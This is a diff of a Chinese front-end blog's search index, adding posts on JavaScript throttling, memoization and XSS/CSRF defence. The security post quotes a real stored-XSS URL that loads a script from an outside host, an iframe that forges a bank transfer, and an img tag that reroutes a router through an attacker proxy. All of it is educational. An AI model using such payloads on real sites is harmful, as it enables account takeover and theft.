-    <content><![CDATA[<h2 id="作用域、闭包相关问题集锦"><a href="#作用域、闭包相关问题集锦" class="headerlink" title="作用域、闭包相关问题集锦"></a>作用域、闭包相关问题集锦</h2><h3 id="IIFE"><a href="#IIFE" class="headerlink" title="IIFE"></a>IIFE</h3><p><a href="https://developer.mozilla.org/zh-CN/docs/Glossary/%E7%AB%8B%E5%8D%B3%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0%E8%A1%A8%E8%BE%BE%E5%BC%8F" target="_blank" rel="noopener">MDN IIFE（ 立即调用函数表达式）</a></p>
-<p>判断以下执行结果：</p>
-<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> env = <span class="string">'outer'</span>;</span><br><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(env);</span><br><span class="line">    <span class="keyword">var</span> env = <span class="string">'inner'</span>;</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure>
-<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> env = <span class="string">'outer'</span>;</span><br><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> env = <span class="string">'inner'</span>;</span><br><span class="line">    <span class="built_in">console</span>.log(env); <span class="comment">// inner</span></span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure>
-<h3 id="扩展-console-log-方法"><a href="#扩展-console-log-方法" class="headerlink" title="扩展 console.log 方法"></a>扩展 console.log 方法</h3><p>扩展 console.log 方法，每个输出前增加一个自增序号。</p>
-<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">myLog</span> (<span class="params">fn</span>) </span>&#123;</span><br><span class="line">    id = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        id++;</span><br><span class="line">        <span class="keyword">var</span> fn_args = [].slice.call(<span class="built_in">arguments</span>);</span><br><span class="line">        fn_args.unshift(id+<span class="string">':'</span>);</span><br><span class="line">        fn.apply(<span class="literal">null</span>, fn_args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log = myLog(<span class="built_in">console</span>.log);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> num = <span class="number">2</span>;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'foo'</span>);       <span class="comment">// 1: foo</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'bar'</span>);       <span class="comment">// 2: bar</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'num:'</span>, num); <span class="comment">// 3: num: 2</span></span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>js 基础</category>
-      </categories>
-      <tags>
-        <tag>js</tag>
-        <tag>面试题</tag>
       </tags>
   </entry>
   <entry>
@@ -1005,22 +1005,23 @@
       </tags>
   </entry>
   <entry>
-    <title>throttle 节流</title>
-    <url>/2018/11/20/throttle/</url>
-    <content><![CDATA[<p>函数节流（throttle）：当持续触发事件时，保证一定时间段内只调用一次事件处理函数。节流通俗解释就比如我们水龙头放水，阀门一打开，水哗哗的往下流，秉着勤俭节约的优良传统美德，我们要把水龙头关小点，最好是如我们心意按照一定规律在某个时间间隔内一滴一滴的往下滴。</p>
-<h3 id="时间戳方法"><a href="#时间戳方法" class="headerlink" title="时间戳方法"></a>时间戳方法</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 时间戳方法</span></span><br><span class="line"><span class="comment"> * @param   &#123;function&#125; method [节流的方法]</span></span><br><span class="line"><span class="comment"> * @param   &#123;number&#125;   delay  [间隔执行时间]</span></span><br><span class="line"><span class="comment"> * @returns &#123;function&#125;        []</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">throttle</span>(<span class="params">method, delay</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> prev = <span class="built_in">Date</span>.now();</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> context = <span class="keyword">this</span>;</span><br><span class="line">        <span class="keyword">var</span> args = <span class="built_in">arguments</span>;</span><br><span class="line">        <span class="keyword">var</span> now = <span class="built_in">Date</span>.now();</span><br><span class="line">        <span class="keyword">if</span> (now - prev &gt; delay) &#123;</span><br><span class="line">            method.apply(context, args);</span><br><span class="line">            prev = <span class="built_in">Date</span>.now();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>看一下用法<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> box = <span class="built_in">document</span>.getElementById(<span class="string">'box'</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">handle</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'hello'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> fun = throttle(handle,<span class="number">1000</span>);</span><br><span class="line">box.addEventListener(<span class="string">'scroll'</span>,fun);</span><br></pre></td></tr></table></figure></p>
-<p>时间戳方法，一般第一次<code>scroll</code>就会触发<code>method</code>。（除非脚本加载完1s内，<code>box</code>就触发了<code>scroll</code>事件。。。）最后一次<code>scroll</code>不会触发<code>method</code>（假设高频事件，最后两次事件挨着）:ghost:<a href="https://jsfiddle.net/xqy_young/Lzk9a7r4/" target="_blank" rel="noopener">demo online</a></p>
-<h3 id="定时器方法"><a href="#定时器方法" class="headerlink" title="定时器方法"></a>定时器方法</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">/** 定时器方法</span></span><br><span class="line"><span class="comment"> * @param   &#123;function&#125; method [节流的方法]</span></span><br><span class="line"><span class="comment"> * @param   &#123;number&#125;   delay  [间隔执行时间]</span></span><br><span class="line"><span class="comment"> * @returns &#123;function&#125;        []</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">throttle</span>(<span class="params">method, delay</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> timer = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> context = <span class="keyword">this</span>;</span><br><span class="line">        <span class="keyword">var</span> args = <span class="built_in">arguments</span>;</span><br><span class="line">        <span class="keyword">if</span> (!timer) &#123;</span><br><span class="line">            timer = setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">                method.apply(context, args);</span><br><span class="line">                timer = <span class="literal">null</span>;</span><br><span class="line">            &#125;, delay);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>使用定时器之后，无论中间有没有中断<code>scroll</code>事件，每次的第一次触发都会延迟1000ms。当最后一次停止触发后，由于定时器的delay延迟，可能还会执行一次函数。<br>:ghost:<a href="https://jsfiddle.net/xqy_young/j698yg5z/" target="_blank" rel="noopener">demo online</a></p>
-<h3 id="定时器-时间戳"><a href="#定时器-时间戳" class="headerlink" title="定时器+时间戳"></a>定时器+时间戳</h3><p>节流中用时间戳或定时器都是可以的。更精确地，可以用时间戳+定时器，当第一次触发事件时马上执行事件处理函数，最后一次触发事件后也还会执行一次事件处理函数。<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 定时器+时间戳</span></span><br><span class="line"><span class="comment"> * @param   &#123;function&#125; method [节流的方法]</span></span><br><span class="line"><span class="comment"> * @param   &#123;number&#125;   delay  [间隔执行时间]</span></span><br><span class="line"><span class="comment"> * @returns &#123;function&#125;        []</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">throttle</span>(<span class="params">method, delay</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> prev = <span class="built_in">Date</span>.now();</span><br><span class="line">    <span class="keyword">var</span> timer = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> now = <span class="built_in">Date</span>.now();</span><br><span class="line">        <span class="keyword">var</span> remain = delay - (now - prev);</span><br><span class="line">        <span class="keyword">var</span> context = <span class="keyword">this</span>;</span><br><span class="line">        <span class="keyword">var</span> args = <span class="built_in">arguments</span>;</span><br><span class="line">        <span class="keyword">if</span> (remain &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">            method.apply(context, args);</span><br><span class="line">            prev = <span class="built_in">Date</span>.now();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            timer = setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                method.apply(context, args);</span><br><span class="line">            &#125;, delay)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-]]></content>
+    <title>纯函数</title>
+    <url>/2018/11/20/pure-function/</url>
+    <content><![CDATA[<h2 id="纯函数"><a href="#纯函数" class="headerlink" title="纯函数"></a>纯函数</h2><blockquote>
+<p>参考<a href="https://mostly-adequate.gitbooks.io/mostly-adequate-guide/ch03.html" target="_blank" rel="noopener">JS函数式编程-Pure Happiness with Pure Functions</a></p>
+</blockquote>
+<p>这里不探讨一些概念，直接看纯函数的应用。以下是来自原书的例子。</p>
+<h3 id="小试身手"><a href="#小试身手" class="headerlink" title="小试身手"></a>小试身手</h3><h4 id="输入缓存"><a href="#输入缓存" class="headerlink" title="输入缓存"></a>输入缓存</h4><p>实现以下要求：</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">squareNumber(<span class="number">4</span>);</span><br><span class="line"><span class="comment">//=&gt; 16</span></span><br><span class="line"></span><br><span class="line">squareNumber(<span class="number">4</span>); <span class="comment">// 从缓存中读取输入值为 4 的结果</span></span><br><span class="line"><span class="comment">//=&gt; 16</span></span><br><span class="line"></span><br><span class="line">squareNumber(<span class="number">5</span>);</span><br><span class="line"><span class="comment">//=&gt; 25</span></span><br><span class="line"></span><br><span class="line">squareNumber(<span class="number">5</span>); <span class="comment">// 从缓存中读取输入值为 5 的结果</span></span><br><span class="line"><span class="comment">//=&gt; 25</span></span><br></pre></td></tr></table></figure>
+<p>实现：</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> memorize = <span class="function"><span class="keyword">function</span>(<span class="params">fn</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> cache = &#123;&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="function">(<span class="params">...args</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> argStr = <span class="built_in">JSON</span>.stringify(args);</span><br><span class="line">        cache[argStr] = cache[argStr] || fn(...args);</span><br><span class="line">        <span class="keyword">return</span> cache[argStr];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> squareNumber = memorize(<span class="function"><span class="params">x</span> =&gt;</span> x * x);</span><br></pre></td></tr></table></figure>]]></content>
       <categories>
         <category>js 基础</category>
       </categories>
       <tags>
         <tag>js</tag>
         <tag>面试题</tag>
+        <tag>函数式编程</tag>
       </tags>
   </entry>
   <entry>
@@ -1212,6 +1213,112 @@
       </tags>
   </entry>
   <entry>
+    <title>throttle 节流</title>
+    <url>/2018/11/20/throttle/</url>
+    <content><![CDATA[<p>函数节流（throttle）：当持续触发事件时，保证一定时间段内只调用一次事件处理函数。节流通俗解释就比如我们水龙头放水，阀门一打开，水哗哗的往下流，秉着勤俭节约的优良传统美德，我们要把水龙头关小点，最好是如我们心意按照一定规律在某个时间间隔内一滴一滴的往下滴。</p>
+<h3 id="时间戳方法"><a href="#时间戳方法" class="headerlink" title="时间戳方法"></a>时间戳方法</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 时间戳方法</span></span><br><span class="line"><span class="comment"> * @param   &#123;function&#125; method [节流的方法]</span></span><br><span class="line"><span class="comment"> * @param   &#123;number&#125;   delay  [间隔执行时间]</span></span><br><span class="line"><span class="comment"> * @returns &#123;function&#125;        []</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">throttle</span>(<span class="params">method, delay</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> prev = <span class="built_in">Date</span>.now();</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> context = <span class="keyword">this</span>;</span><br><span class="line">        <span class="keyword">var</span> args = <span class="built_in">arguments</span>;</span><br><span class="line">        <span class="keyword">var</span> now = <span class="built_in">Date</span>.now();</span><br><span class="line">        <span class="keyword">if</span> (now - prev &gt; delay) &#123;</span><br><span class="line">            method.apply(context, args);</span><br><span class="line">            prev = <span class="built_in">Date</span>.now();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>看一下用法<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> box = <span class="built_in">document</span>.getElementById(<span class="string">'box'</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">handle</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'hello'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> fun = throttle(handle,<span class="number">1000</span>);</span><br><span class="line">box.addEventListener(<span class="string">'scroll'</span>,fun);</span><br></pre></td></tr></table></figure></p>
+<p>时间戳方法，一般第一次<code>scroll</code>就会触发<code>method</code>。（除非脚本加载完1s内，<code>box</code>就触发了<code>scroll</code>事件。。。）最后一次<code>scroll</code>不会触发<code>method</code>（假设高频事件，最后两次事件挨着）:ghost:<a href="https://jsfiddle.net/xqy_young/Lzk9a7r4/" target="_blank" rel="noopener">demo online</a></p>
+<h3 id="定时器方法"><a href="#定时器方法" class="headerlink" title="定时器方法"></a>定时器方法</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">/** 定时器方法</span></span><br><span class="line"><span class="comment"> * @param   &#123;function&#125; method [节流的方法]</span></span><br><span class="line"><span class="comment"> * @param   &#123;number&#125;   delay  [间隔执行时间]</span></span><br><span class="line"><span class="comment"> * @returns &#123;function&#125;        []</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">throttle</span>(<span class="params">method, delay</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> timer = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> context = <span class="keyword">this</span>;</span><br><span class="line">        <span class="keyword">var</span> args = <span class="built_in">arguments</span>;</span><br><span class="line">        <span class="keyword">if</span> (!timer) &#123;</span><br><span class="line">            timer = setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">                method.apply(context, args);</span><br><span class="line">                timer = <span class="literal">null</span>;</span><br><span class="line">            &#125;, delay);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>使用定时器之后，无论中间有没有中断<code>scroll</code>事件，每次的第一次触发都会延迟1000ms。当最后一次停止触发后，由于定时器的delay延迟，可能还会执行一次函数。<br>:ghost:<a href="https://jsfiddle.net/xqy_young/j698yg5z/" target="_blank" rel="noopener">demo online</a></p>
+<h3 id="定时器-时间戳"><a href="#定时器-时间戳" class="headerlink" title="定时器+时间戳"></a>定时器+时间戳</h3><p>节流中用时间戳或定时器都是可以的。更精确地，可以用时间戳+定时器，当第一次触发事件时马上执行事件处理函数，最后一次触发事件后也还会执行一次事件处理函数。<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 定时器+时间戳</span></span><br><span class="line"><span class="comment"> * @param   &#123;function&#125; method [节流的方法]</span></span><br><span class="line"><span class="comment"> * @param   &#123;number&#125;   delay  [间隔执行时间]</span></span><br><span class="line"><span class="comment"> * @returns &#123;function&#125;        []</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">throttle</span>(<span class="params">method, delay</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> prev = <span class="built_in">Date</span>.now();</span><br><span class="line">    <span class="keyword">var</span> timer = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> now = <span class="built_in">Date</span>.now();</span><br><span class="line">        <span class="keyword">var</span> remain = delay - (now - prev);</span><br><span class="line">        <span class="keyword">var</span> context = <span class="keyword">this</span>;</span><br><span class="line">        <span class="keyword">var</span> args = <span class="built_in">arguments</span>;</span><br><span class="line">        <span class="keyword">if</span> (remain &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">            method.apply(context, args);</span><br><span class="line">            prev = <span class="built_in">Date</span>.now();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            timer = setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                method.apply(context, args);</span><br><span class="line">            &#125;, delay)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+]]></content>
+      <categories>
+        <category>js 基础</category>
+      </categories>
+      <tags>
+        <tag>js</tag>
+        <tag>面试题</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>xss 和 csrf 防范</title>
+    <url>/2020/07/12/xss-and-csrf/</url>
+    <content><![CDATA[<h3 id="XSS-and-CSRF"><a href="#XSS-and-CSRF" class="headerlink" title="XSS and CSRF"></a>XSS and CSRF</h3><p>来自维基百科：</p>
+<ul>
+<li><strong>CSS</strong> </li>
+</ul>
+<p>跨站脚本（英语：Cross-site scripting，通常简称为：XSS）是一种网站应用程序的安全漏洞攻击，是代码注入的一种。它允许恶意用户将代码注入到网页上，其他用户在观看网页时就会受到影响。这类攻击通常包含了HTML以及用户端脚本语言。</p>
+<p>XSS攻击通常指的是通过利用网页开发时留下的漏洞，通过巧妙的方法注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序。这些恶意网页程序通常是JavaScript，但实际上也可以包括Java，VBScript，ActiveX，Flash或者甚至是普通的HTML。攻击成功后，攻击者可能得到更高的权限（如执行一些操作）、私密网页内容、会话和cookie等各种内容。</p>
+<ul>
+<li><strong>CSRF</strong></li>
+</ul>
+<p>跨站请求伪造（英语：Cross-site request forgery），也被称为 one-click attack 或者 session riding，通常缩写为 CSRF 或者 XSRF， 是一种挟制用户在当前已登录的Web应用程序上执行非本意的操作的攻击方法。[1] 跟跨网站脚本（XSS）相比，XSS 利用的是用户对指定网站的信任，CSRF 利用的是网站对用户网页浏览器的信任。</p>
+<h4 id="XSS-攻击方法及防范"><a href="#XSS-攻击方法及防范" class="headerlink" title="XSS 攻击方法及防范"></a>XSS 攻击方法及防范</h4><p>XSS 大致可以分为两类：反射型 XSS 和储存型 XSS 。</p>
+<ul>
+<li>反射型 XSS</li>
+</ul>
+<p>被动的非持久性XSS。诱骗用户点击URL带攻击代码的链接，服务器解析后响应，在返回的响应内容中隐藏和嵌入攻击者的XSS代码，被浏览器执行，从而攻击用户。<br>URL可能被用户怀疑，但是可以通过短网址服务将之缩短，从而隐藏自己。</p>
+<ul>
+<li>储存型 XSS</li>
+</ul>
+<p>主动提交恶意数据到服务器，攻击者在数据中嵌入代码，这样当其他用户请求后，服务器从数据库中查询数据并发给用户，用户浏览此类页面时就可能受到攻击。典型的例子是留言板。</p>
+<p>还有 DOM-based XSS（基于 DOM 的 XSS），一般是攻击者通过代码注入（输入框，留言板）执行恶意代码，盗取 cookie ，获取敏感信息，进一步发起 CSRF 。</p>
+<p>防范：</p>
+<ul>
+<li>用户输入过滤。对用户提交的数据进行有效性验证，仅接受指定长度范围内并符合我们期望格式的的内容提交，阻止或者忽略除此外的其他任何数据</li>
+<li>用户输出转义，当需要将一个字符串输出到Web网页时，同时又不确定这个字符串中是否包括XSS特殊字符，为了确保输出内容的完整性和正确性，输出HTML属性时可以使用HTML转义编码（HTMLEncode）进行处理，输出到 <code>&lt;script&gt;</code> 中，可以进行JS编码。现在主流框架 Vue，React，或者衍生的 UI 框架，其实都有对输入输出做 XSS 防范。</li>
+<li>将重要的cookie标记为httponly，这样的话当浏览器向Web服务器发起请求的时就会带上cookie字段，但是在js脚本中却不能访问这个cookie，这样就避免了XSS攻击利用JavaScript的document.cookie获取cookie。【这种方法其实不是避免 XSS ，只是减小了可能的危害】</li>
+<li><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP" target="_blank" rel="noopener">CSP</a>指定页面有哪些资源允许有哪些来源，可以通过请求头的<code>Content-Security-Policy</code>头部，或html文档的meta标签实现。如下是掘金某篇博文的html文档header。<br><img src="xss1.png" alt=""></p>
+</li>
+<li><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/Security/%E5%AD%90%E8%B5%84%E6%BA%90%E5%AE%8C%E6%95%B4%E6%80%A7" target="_blank" rel="noopener">SRI</a>在第三方 CDN 服务被入侵或回源被运营商劫持、文件内容被加入恶意代码时，网站如果启用了 SRI 策略，那么在支持 SRI 的浏览器下，被篡改的文件无法执行。</p>
+<ul>
+<li>对外链资源（这里是script，当然link标签也可以）使用特定算法A生成一个哈希值B，B经base64编码得到C.将<code>${A}-${C}</code><br>注入到script标签的<code>integrity</code>属性。例如：github的SRI策略<br><img src="SRI.png" alt=""><br>上图<code>sha512</code>是使用的哈希算法。 <code>-</code>后面的是编码后的哈希值。浏览器发现script标签有integrity属性，会用<code>sha512</code>计算这个script文件的哈希值，并base64编码后，和integrity的编码结果做比较。只有完全匹配才会通过校验并加载资源</li>
+<li>SRI是一种“宁为玉碎，不为瓦全”的态度了，但是如果重要脚本被劫持而无法执行，可能会使得整站功能不可用。可以使用fallback方法，改为加载本站资源</li>
+</ul>
+</li>
+</ul>
+<p><a href="https://coolshell.cn/articles/4914.html" target="_blank" rel="noopener">2011年新浪微博的 XSS 攻击</a>是储存型 XSS 。其利用了微博广场页面 <a href="http://weibo.com/pub/star" target="_blank" rel="noopener">http://weibo.com/pub/star</a> 的一个URL注入了js脚本，其通过 <a href="http://163.fm/PxZHoxn" target="_blank" rel="noopener">http://163.fm/PxZHoxn</a> 短链接服务，将链接指向：</p>
+<p><a href="http://weibo.com/pub/star/g/xyyyd%22%3E%3Cscript%20src=//www.2kt.cn/images/t.js%3E%3C/script%3E?type=update" target="_blank" rel="noopener">http://weibo.com/pub/star/g/xyyyd%22%3E%3Cscript%20src=//www.2kt.cn/images/t.js%3E%3C/script%3E?type=update</a></p>
+<p>注意，上面URL链接中的其实就是 <code>&lt;script src=//www.2kt.cn/images/t.js&gt;&lt;/script&gt;</code>。</p>
+<p>点击这个链接的用户会自动发一条类似“郭美美事件的一些未注意到的细节 <a href="https://t.cn/amsDE”" target="_blank" rel="noopener">https://t.cn/amsDE”</a> 的微博（博文中的链接是一个新的 evil url，一旦其他用户点击，就会把类似链接传递下去）。</p>
+<h4 id="CSRF-攻击方法和防范"><a href="#CSRF-攻击方法和防范" class="headerlink" title="CSRF 攻击方法和防范"></a>CSRF 攻击方法和防范</h4><p>以下内容译自 <a href="http://www.veracode.com/security/csrf" target="_blank" rel="noopener">CROSS-SITE REQUEST FORGERY GUIDE: LEARN ALL ABOUT CSRF ATTACKS AND CSRF PROTECTION</a></p>
+<p>CSRF：恶意网站向一个 Web app 发出请求，而用户已经在别的站点认证了这个 Web 程序。用这种方法，攻击者可以通过用户信任的浏览器，访问目标 web app 的功能。被攻击的目标包括 Web app，比如社交媒体，浏览器邮件客户端，网银和网络设备的 Web 界面。</p>
+<hr>
+<h5 id="CSRF-的关键概念"><a href="#CSRF-的关键概念" class="headerlink" title="CSRF 的关键概念"></a>CSRF 的关键概念</h5><ul>
+<li>恶意请求从用户访问的站点发送到攻击者觉得经过受害者认证的其他站点。</li>
+<li>通过目标站点身份验证的恶意请求，经受害者的浏览器被发送到目标站点。</li>
+<li>漏洞存在于受影响的 Web app 中，而不是受害者的浏览器或托管CSRF的站点。</li>
+</ul>
+<hr>
+<h5 id="执行一次-CSRF-攻击"><a href="#执行一次-CSRF-攻击" class="headerlink" title="执行一次 CSRF 攻击"></a>执行一次 CSRF 攻击</h5><p>CSRF 中，攻击者利用了目标 Web app 的身份认证机制。一次 CSRF 中，受害者必须通过目标站点的身份认证（登陆）。举个例子，网银 <code>examplebank.com</code> 有 CSRF 漏洞，如果我浏览这个站点上藏有 CSRF 隐患的页面，但是我没有登录，那么无事发生。假如我登录了，攻击中的请求将被执行，看起来就好像是我做的一样。（浏览器无法辨别用户是否主动请求）。</p>
+<p>接下来讲一下，上面的攻击的细节。首先假设我在 <code>examplebank.com</code> 登陆了我的帐号，所以我可以做一些网上银行操作，包括转账。</p>
+<p>现在我碰巧访问了 <code>somemalicioussite.com</code> ，这个站点攻击 <code>examplebank.com</code> 的用户，并且在本站设置了一个 CSRF 攻击，中招的用户会向帐号 123456789 转帐 $1,500.00 。在 <code>somemalicioussite.com</code> 的某个地方，攻击者加了这样一行代码：</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;iframe src=<span class="string">"//www.veracode.com/%3Ca%20href%3D"</span>http:<span class="comment">//examplebank.com/app/transferFunds?amount=1500&amp;destinationAccount=123456789"&gt;http://examplebank.com/app/transferFunds?amount=1500&amp;destinationAccount=..." &gt;</span></span><br></pre></td></tr></table></figure>
+<p>通过加载这个 iframe ，我的浏览器会向 <code>examplebank.com</code> 发送一条转账请求，因为我已经在 <code>examplebank.com</code> 登陆了，所以请求将被执行，$1,500.00 转给了帐号 123456789 。</p>
+<hr>
+<h5 id="另一个-CSRF-例子"><a href="#另一个-CSRF-例子" class="headerlink" title="另一个 CSRF 例子"></a>另一个 CSRF 例子</h5><p>我买了一个新的家居无线路由器。同诸多 wifi 路由器，它通过一个 web 界面设置参数。我收到路由器的时候，它有一个内置 IP 地址 192.168.1.1 。我正不知如何设置路由器，刚好 <code>somemalicioussite.com</code> 上面有一个帖子有相关教程。攻击者在这个教程里面为我的路由器添加了一个代理，指向服务 123.45.67.89 ，以后通过路由器的流量都会经过这个代理，包括密码，sessionId。</p>
+<p>当我点击这个教程的时候，我忽略了一张加载失败的 1px 的小图：</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;img src=”http:<span class="comment">//192.168.1.1/admin/config/outsideInterface?nexthop=123.45.67.89” alt=”pwned” height=”1” width=”1”/&gt;</span></span><br></pre></td></tr></table></figure>
+<p>攻击者知道我正在读他们的教程，我会登陆路由器设置界面，所以他们把 CSRF 攻击藏在教程里面。有了上面的设置，我的路由会被添加一个代理服务器，所有经过路由器的流量也会经过这个代理服务器，攻击者就可以搞坏事了。</p>
+<hr>
+<h5 id="预防-CSRF"><a href="#预防-CSRF" class="headerlink" title="预防 CSRF"></a>预防 CSRF</h5><ul>
+<li>修改请求不要使用 GET ，暴露参数</li>
+<li>img/script 标签可以跨域，能带上cookie，并且还支持除GET之外的其它方式。所以这种方式也是能实现CSRF的</li>
+</ul>
+<p>方法一是每次请求都要在参数里面显示地带上token即登陆的票，虽然跨域请求能带上cookie，但是通过document.cookie仍然是获取不到其它源的cookie的，所以攻击者无法在代码里面拿到cookie里面的token，所以就没办法了。方法一的缺点是会暴露token，所以需要带token的最好不能是GET，因为GET会把参数拼在url里面，用户可能会无意把链接发给别人，但不知道这个链接带上了自己的登陆信息。</p>
+<p>方法二是每次转账请求前都先请求一个随机串，这个串只能用一次转账或者支付请求，用完就废弃，只有这个串对得上才能请求成功，攻击者是无法拿到这个串的，因为如果跨域请求带cookie，浏览器要求Access-Control-Allow-Origin不能为通配符，只能为指定的源。</p>
+<blockquote>
+<p>参考文章</p>
+</blockquote>
+<blockquote>
+<p><a href="https://www.imooc.com/article/13553" target="_blank" rel="noopener">对于跨站脚本攻击（XSS攻击）的理解和总结</a></p>
+<p><a href="https://www.zhihu.com/question/21289758" target="_blank" rel="noopener">存储型XSS与反射型XSS有什么区别？</a></p>
+<p><a href="https://coolshell.cn/articles/4914.html" target="_blank" rel="noopener">新浪微博的XSS攻击</a></p>
+<p><a href="http://www.veracode.com/security/csrf" target="_blank" rel="noopener">CROSS-SITE REQUEST FORGERY GUIDE: LEARN ALL ABOUT CSRF ATTACKS AND CSRF PROTECTION</a></p>
+<p><a href="https://fed.renren.com/2018/01/20/cross-origin/" target="_blank" rel="noopener">我知道的跨域与安全</a></p>
